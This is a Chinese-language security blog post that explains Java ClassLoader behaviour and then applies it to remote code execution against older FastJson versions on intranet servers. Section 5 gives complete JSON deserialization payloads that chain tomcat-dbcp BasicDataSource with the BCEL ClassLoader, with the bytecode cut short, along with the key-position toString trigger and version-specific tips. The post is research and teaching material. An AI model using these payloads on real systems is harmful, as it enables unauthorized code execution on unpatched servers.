都快2020年了，平时偶尔还是能遇到一些低版本的FastJson漏洞，现在遇到比较多的是部署在内网服务器上的场景。从外网对漏洞点进行探测，只有DNSLog可以成功请求回来，因为目标服务器没有外网、无法反连，自然就用不了JNDI注入的利用方式。那是不是就无法深入利用了呢？又如何向业务方证明这里的危害，今天我们借这个例子讲一下Java的动态类加载的机制。

  

> 想了解FastJson内网利用方式的可以直接跳到第5小节  
>

// 欢迎订阅我的微信公众号：安全引擎

##  **1 Java类加载器：ClassLoader**

##

  

我们通常会把编程语言的处理器分为`解释器`和`编译器`。解释器是一种用于执行程序的软件，它会根据程序代码中的算法执行运算，如果这个执行软件是根据虚拟的或者类似机器语言的程序设计语言写成，那也称为虚拟机。编译器则是将某种语言代码转换为另外一种语言的程序，通常会转换为机器语言。

有些编程语言会混用解释器和编译器，比如Java会先通过编译器将源代码转换为Java二进制代码（字节码），并将这种虚拟的机器语言保存在文件中（通常是.class文件），之后通过Java虚拟机（JVM）的解释器来执行这段代码。

Java是面向对象的语言，字节码中包含了很多Class信息。在 JVM
解释执行的过程中，ClassLoader就是用来加载Java类的，它会将Java字节码中的Class加载到内存中。而每个 Class 对象的内部都有一个
classLoader 属性来标识自己是由哪个 ClassLoader 加载的。

    
    
    class Class<T> {  
      
        ...  
        private Class(ClassLoader loader) {  
        // Initialize final field for classLoader.  The initialization value of non-null  
          // prevents future JIT optimizations from assuming this final field is null.  
          classLoader = loader;  
        }  
        ...  
        private final ClassLoader classLoader;  
      
        ...  
      
    }  
    

ClassLoader类位于java.lang.ClassLoader，官方描述是这样的：

    
    
    /**  
     * A class loader is an object that is responsible for loading classes. The  
     * class <tt>ClassLoader</tt> is an abstract class.  Given the <a  
     * href="#name">binary name</a> of a class, a class loader should attempt to  
     * locate or generate data that constitutes a definition for the class.  A  
     * typical strategy is to transform the name into a file name and then read a  
     * "class file" of that name from a file system.  
     *  
     * ...  
     *  
     * <p> The <tt>ClassLoader</tt> class uses a delegation model to search for  
     * classes and resources.  Each instance of <tt>ClassLoader</tt> has an  
     * associated parent class loader.  When requested to find a class or  
     * resource, a <tt>ClassLoader</tt> instance will delegate the search for the  
     * class or resource to its parent class loader before attempting to find the  
     * class or resource itself.  The virtual machine's built-in class loader,  
     * called the "bootstrap class loader", does not itself have a parent but may  
     * serve as the parent of a <tt>ClassLoader</tt> instance.  
     *  
     * ...  
     **/  
    public abstract class ClassLoader {  
        ...  
    }  
    

  

## 2 常见的ClassLoader

  

JDK内置常见的ClassLoader主要有这几个：BootstrapClassLoader、ExtensionClassLoader、AppClassLoader、URLClassLoader、ContextClassLoader。

ClassLoader采用了委派模式（Parents Delegation
Model）来搜索类和资源。每一个ClassLoader类的实例都有一个父级ClassLoader，当需要加载类时，ClassLoader实例会委派父级ClassLoader先进行加载，如果无法加载再自行加载。JVM
内置的 BootstrapClassLoader 自身没有父级ClassLoader，而它可以作为其他ClassLoader实例的父级。

  * BootstrapClassLoader，启动类加载器/根加载器，负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.*.* 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。

  * ExtClassLoader，扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，库名通常以 javax 开头。

  * AppClassLoader，应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。

  * URLClassLoader，ClassLoader抽象类的一种实现，它可以根据URL搜索类或资源，并进行远程加载。BootstrapClassLoader、ExtClassLoader、AppClassLoader等都是 URLClassLoader 的子类。

AppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader()
得到，开发者编写代码中的类就是通过AppClassLoader进行加载的，包括 main() 方法中的第一个用户类。

我们可以运行如下代码查看ClassLoader的委派关系：

> ClassLoader.getParent() 可以获取用于委派的父级class loader，通常会返回null来表示bootstrap class
> loader。
    
    
    public class JavaClassLoader {  
      
        public static void main(String[] args) {  
            ClassLoader appClassloader = ClassLoader.getSystemClassLoader();  
            ClassLoader extensionClassloader = appClassloader.getParent();  
            System.out.println("AppClassLoader is " + appClassloader);  
            System.out.println("The parent of AppClassLoader is " + extensionClassloader);  
            System.out.println("The parent of ExtensionClassLoader is " + extensionClassloader.getParent());  
        }  
    }  
    

执行结果：

    
    
    AppClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2  
    The parent of AppClassLoader is sun.misc.Launcher$ExtClassLoader@5e2de80c  
    The parent of ExtensionClassLoader is null  
    

而 ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader
的子类，它们都是从本地文件系统里加载类库。URLClassLoader 不但可以加载远程类库，还可以加载本地路径的类库，取决于构造器中不同的地址形式。

ExtClassLoader 和 AppClassLoader 类的实现代码位于rt.jar 中的 sun.misc.Launcher
类中，Launcher是由BootstrapClassLoader加载的。ExtClassLoader 和 AppClassLoader 定义如下：

    
    
    static class ExtClassLoader extends URLClassLoader {  
        private static volatile Launcher.ExtClassLoader instance;  
      
        public static Launcher.ExtClassLoader getExtClassLoader() throws IOException {  
        if (instance == null) {  
            Class var0 = Launcher.ExtClassLoader.class;  
            synchronized(Launcher.ExtClassLoader.class) {  
                if (instance == null) {  
                    instance = createExtClassLoader();  
                }  
            }  
        }  
      
        return instance;  
    }  
      
    ...  
      
    static class AppClassLoader extends URLClassLoader {  
        final URLClassPath ucp = SharedSecrets.getJavaNetAccess().getURLClassPath(this);  
      
        public static ClassLoader getAppClassLoader(final ClassLoader var0) throws IOException {  
        final String var1 = System.getProperty("java.class.path");  
        final File[] var2 = var1 == null ? new File[0] : Launcher.getClassPath(var1);  
        return (ClassLoader)AccessController.doPrivileged(  
            new PrivilegedAction<Launcher.AppClassLoader>() {  
            public Launcher.AppClassLoader run() {  
                URL[] var1x = var1 == null ? new URL[0] : Launcher.pathToURLs(var2);  
                return new Launcher.AppClassLoader(var1x, var0);  
            }  
        });  
    }  
    

  

## 3 ClassLoader的几个重要方法

  

ClassLoader 中有几个重要的方法：loadClass()、findClass()、defineClass()。ClassLoader
尝试定位或者产生一个Class的数据，通常是把二进制名字转换成文件名然后到文件系统中找到该文件。

  * loadClass(String classname)，参数为需要加载的全限定类名，该方法会先查看目标类是否已经被加载，查看父级加载器并递归调用loadClass()，如果都没找到则调用findClass()。

  * findClass()，搜索类的位置，一般会根据名称或位置加载.class字节码文件，获取字节码数组，然后调用defineClass()。

  * defineClass()，将字节码转换为 JVM 的 java.lang.Class 对象。

## // 欢迎订阅我的微信公众号：安全引擎

## 4 Class.forName()

  

Class.forName() 也可以用来动态加载指定的类，它会返回一个指定类/接口的 Class 对象，如果没有指定ClassLoader，
那么它会使用BootstrapClassLoader来进行类的加载。该方法定义如下：  

##

    
    
    public static Class<?> forName(String name, boolean initialize, ClassLoader loader) throws ClassNotFoundException  
      
    public static Class<?> forName(String className) throws ClassNotFoundException  
    

Class.forName() 和 ClassLoader.loadClass()
这两个方法都可以用来加载目标类，但是都不支持加载原生类型，比如：int。Class.forName() 可以加载数组，而
ClassLoader.loadClass() 不能。

    
    
    // 动态加载 int 数组  
      
    Class ia = Class.forName("[I");  
    System.out.println(ia);  
      
    // 会输出：  
    // class [I  
      
    Class ia2 =  ClassLoader.getSystemClassLoader().loadClass("[I");   
      
    // 数组类型不能使用ClassLoader.loadClass方法，会报错：  
    // Exception in thread "main" java.lang.ClassNotFoundException: [I  
    

Class.forName()方法实际上也是调用的 CLassLoader
来实现的，调用时也可以在参数中明确指定ClassLoader。与ClassLoader.loadClass() 一个小小的区别是，forName()
默认会对类进行初始化，会执行类中的 static 代码块。而ClassLoader.loadClass() 默认并不会对类进行初始化，只是把类加载到了
JVM 虚拟机中。

我们执行如下测试代码：

    
    
    class Test{  
      
        static{  
            System.out.println("// This is static code executed");  
        }  
    }  
      
    public class JavaClassLoader {  
      
        public static void main(String[] args) throws ClassNotFoundException {  
            ClassLoader appClassloader = ClassLoader.getSystemClassLoader();        
            System.out.println("Execute Class.forName:");  
            Class cl = Class.forName("Test");  
            System.out.println(cl);  
            System.out.println("Execute ClassLoader:");  
            Class cl2 = appClassloader.loadClass("Test");  
            System.out.println(cl2);  
      
        }  
    }  
    

执行结果如下，可以看到Class.forName()时，static代码块被执行了：

    
    
    Execute Class.forName:  
    // This is static code executed  
    class Test  
    Execute ClassLoader:  
    class Test  
    

// 欢迎订阅我的微信公众号：安全引擎

## 5 FastJson内网利用

  

还记得FastJson TemplatesImpl利用链吗 ？  

TemplatesImpl.getOutputProperties()  
> TemplatesImpl.newTransformer()  
> TemplatesImpl.getTransletInstance()  
> TemplatesImpl.defineTransletClasses()
    
    
    private void defineTransletClasses()  
    throws TransformerConfigurationException {  
      
        ...  
                _class[i] = loader.defineClass(_bytecodes[i]);  
                final Class superClass = _class[i].getSuperclass();  
      
                // Check if this is the main class  
                if (superClass.getName().equals(ABSTRACT_TRANSLET)) {  
        ...  
    }  
    

这个PoC原理上也是利用了 ClassLoader
动态加载恶意代码，在Payload中直接传入字节码。TransletClassLoader.defineClass() 将 Bytecode
字节码转为Class对象。但是这种限制比较多，要求开发者在调用parseObject()时额外设置
Feature.SupportNonPublicField，这是不太常见的使用场景。

其实在2017年FastJson漏洞刚公布出来的时候，我们就很快捕获到了一个比较通用的Exploit，它利用了org.apache.tomcat.dbcp.dbcp.BasicDataSource类。这个Payload不需要反连，不要求特定的代码写法，直接传入恶意代码bytecode完成利用，而且依赖包
tomcat-dbcp
使用也比较广泛，是Tomcat的数据库驱动组件。但是网上对这个PoC的分析文章并不是很多，印象中只有genxor在<DefineClass在Java反序列化当中的利用>一文中有较为完整的分析。PoC如下：

    
    
    {  
        {  
            "x":{  
                    "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",  
                    "driverClassLoader": {  
                        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"  
                    },  
                    "driverClassName": "$$BCEL$$$l$8b$I$A$..."  
            }  
        }: "x"  
    }  
    

这里反序列化生成了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 对象，并完成了命令执行。直接看利用链：

BasicDataSource.getConnection()  
> createDataSource()  
> createConnectionFactory()
    
    
    protected ConnectionFactory createConnectionFactory() throws SQLException {  
      
        ...  
      
        if (driverClassLoader == null) {  
                driverFromCCL = Class.forName(driverClassName);  
        } else {  
                driverFromCCL = Class.forName(driverClassName, true, driverClassLoader);  
        }  
        ...  
    

经过一连串的调用链，在 BasicDataSource.createConnectionFactory() 中会调用
Class.forName()，还可以自定义ClassLoader。如上一节所说 Class.forName()
在动态加载类时，默认会进行初始化，所以这里在动态加载的过程中会执行 static 代码段。

那么在可控 classname 和 classloader 的情况下，如何实现命令执行呢？

接下来不得不提这个PoC中的 com.sun.org.apache.bcel.internal.util.ClassLoader 了，这是一个神奇的
ClassLoader，因为它会直接从 classname 中提取 Class 的 bytecode 数据。

    
    
    protected Class loadClass(String class_name, boolean resolve) throws ClassNotFoundException  
    {  
        ...  
      
        if(class_name.indexOf("$$BCEL$$") >= 0)  
              clazz = createClass(class_name);  
        else {   
          ...  
        }  
      
        if(clazz != null) {  
          byte[] bytes  = clazz.getBytes();  
          cl = defineClass(class_name, bytes, 0, bytes.length);  
        } else  
          cl = Class.forName(class_name);  
      
            ....  
      
        return cl;  
    }  
      
    /*  
    * The name contains the special token $$BCEL$$. Everything before that  
    * token is consddered to be a package name. You can encode you own  
    * arguments into the subsequent string.   
    * The default implementation interprets the string as a encoded compressed  
    * Java class, unpacks and decodes it with the Utility.decode() method, and  
    * parses the resulting byte array and returns the resulting JavaClass object.  
    *  
    * @param class_name compressed byte code with "$$BCEL$$" in it  
    */  
    protected JavaClass createClass(String class_name) {  
        ...  
    }  
    

如果 classname 中包含 `$$BCEL$$` ，这个 ClassLoader
则会将`$$BCEL$$`后面的字符串按照BCEL编码进行解码，作为Class的字节码，并调用 defineClass() 获取 Class 对象。

于是我们通过FastJson反序列化，反序列化生成一个 BasicDataSource 对象，并将它的成员变量 classloader 赋值为
com.sun.org.apache.bcel.internal.util.ClassLoader 对象，将 classname 赋值为
经过BCEL编码的字节码（假设对应的类为Evil.class），我们将需要执行的代码写在 Evil.class 的 static 代码块中即可。

BCEL编码和解码的方法：

    
    
    import com.sun.org.apache.bcel.internal.classfile.Utility;  
      
    ...  
      
    String s =  Utility.encode(data,true);  
      
    byte[] bytes  = Utility.decode(s, true);  
      
    ...  
    

###  

###  **0x05.1 你知道吗**

再回顾一下PoC

    
    
    {  
        {  
            "x":{  
                    "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",  
                    "driverClassLoader": {  
                        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"  
                    },  
                    "driverClassName": "$$BCEL$$$l$8b$I$A$..."  
            }  
        }: "x"  
    }  
    

这里PoC结构上还有一个值得注意的地方在于，

  1. 先是将 {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"……} 这一整段放到JSON Value的位置上，之后在外面又套了一层 "{}"。

  2. 之后又将 Payload 整个放到了JSON 字符串中 Key 的位置上。

为什么这么设计呢？

因为为了完成前面说的一整个利用链，我们需要触发 BasicDataSource.getConnection() 方法。

我在
[FastJson反序列化漏洞利用的三个细节](https://mp.weixin.qq.com/s?__biz=MzAxNTg0ODU4OQ==&mid=2650358434&idx=1&sn=3aab3b8d786c93434921e6d8bae948ae&scene=21#wechat_redirect)
提到过，FastJson中的 JSON.parse() 会识别并调用目标类的 setter 方法以及某些满足特定条件的 getter 方法，然而
getConnection() 并不符合特定条件，所以正常来说在 FastJson 反序列化的过程中并不会被调用。

// 欢迎订阅我的微信公众号：安全引擎  

原PoC中很巧妙的利用了 JSONObject对象的 toString() 方法实现了突破。JSONObject是Map的子类，在执行toString()
时会将当前类转为字符串形式，会提取类中所有的Field，自然会执行相应的 getter 、is等方法。

首先，在 {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"……}
这一整段外面再套一层{}，反序列化生成一个 JSONObject 对象。

然后，将这个 JSONObject 放在 JSON Key 的位置上，在 JSON 反序列化的时候，FastJson 会对 JSON Key 自动调用
toString() 方法：

    
    
    com.alibaba.fastjson.parser.DefaultJSONParser.parseObject  
    DefaultJSONParser.java:436  
      
    if (object.getClass() == JSONObject.class) {  
        key = (key == null) ? "null" : key.toString();  
    }  
    

于是乎就触发了 BasicDataSource.getConnection()。PoC最完整的写法应该是：

    
    
    {  
        {  
            "@type": "com.alibaba.fastjson.JSONObject",  
            "x":{  
                    "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",  
                    "driverClassLoader": {  
                        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"  
                    },  
                    "driverClassName": "$$BCEL$$$l$8b$I$A$..."  
            }  
        }: "x"  
    }  
    

当然，如果目标环境的开发者代码中是调用的是 JSON.parseObject() ，那就不用这么麻烦了。与 parse() 相比，parseObject()
会额外的将 Java 对象转为 JSONObject 对象，即调用 JSON.toJSON()，在处理过程中会调用所有的 setter 和 getter
方法。

所以对于 JSON.parseObject()，直接传入这样的Payload也能触发：

    
    
    {  
            "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",  
            "driverClassLoader": {  
                "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"  
            },  
            "driverClassName": "$$BCEL$$$l$8b......"  
    }  
    

###  

###  **0x05.2 Tips**

BasicDataSource类在旧版本的 tomcat-dbcp 包中，对应的路径是
org.apache.tomcat.dbcp.dbcp.BasicDataSource。

比如：6.0.53、7.0.81等版本。MVN 依赖写法如下：

    
    
    <!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp -->  
    <dependency>  
        <groupId>org.apache.tomcat</groupId>  
        <artifactId>dbcp</artifactId>  
        <version>6.0.53</version>  
    </dependency>  
    

在Tomcat 8.0之后包路径有所变化，更改为了
org.apache.tomcat.dbcp.dbcp2.BasicDataSource，构造PoC的时候需要注意一下。MVN依赖写法如下：

    
    
    <!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp -->  
    <dependency>  
        <groupId>org.apache.tomcat</groupId>  
        <artifactId>tomcat-dbcp</artifactId>  
        <version>9.0.8</version>  
    </dependency>  
    

Happy New Year~  

欢迎订阅我的微信公众

![secengine.jpg](https://kingx.me/images/secengine.jpg)

  

